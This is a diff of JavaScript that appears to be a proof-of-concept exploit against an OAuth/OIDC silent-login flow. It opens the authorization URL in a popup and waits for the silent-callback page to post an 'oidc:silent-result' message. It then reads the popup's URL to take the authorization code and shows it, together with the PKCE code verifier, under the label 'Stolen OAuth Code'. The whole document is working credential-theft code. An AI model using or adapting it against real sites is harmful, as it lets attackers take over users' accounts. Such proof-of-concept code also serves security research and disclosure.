@@ -11,19 +11,21 @@
     + '&code_challenge_method=S256'
     + '&state=' + Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');
 
-  const w = window.open(authUrl);
-
-  const poll = setInterval(() => {
-    try {
-      if (w.location.href.includes('silent-callback')) {
-        clearInterval(poll);
-        const code = new URLSearchParams(new URL(w.location.href).search).get('code');
+  // Listen for the message the silent-callback page posts to window.opener
+  // At that moment the popup is same-origin so we can read its URL
+  window.addEventListener('message', function handler(e) {
+    if (e.data && e.data.type === 'oidc:silent-result') {
+      window.removeEventListener('message', handler);
+      try {
+        const url = w.location.href;
+        const code = new URLSearchParams(new URL(url).search).get('code');
         w.close();
         if (code) {
           alert('Stolen OAuth Code:\n' + code + '\n\nCode Verifier:\n' + v);
         }
-      }
-    } catch (e) {
+      } catch (e) {}
     }
-  }, 100);
+  });
+
+  const w = window.open(authUrl);
 })();
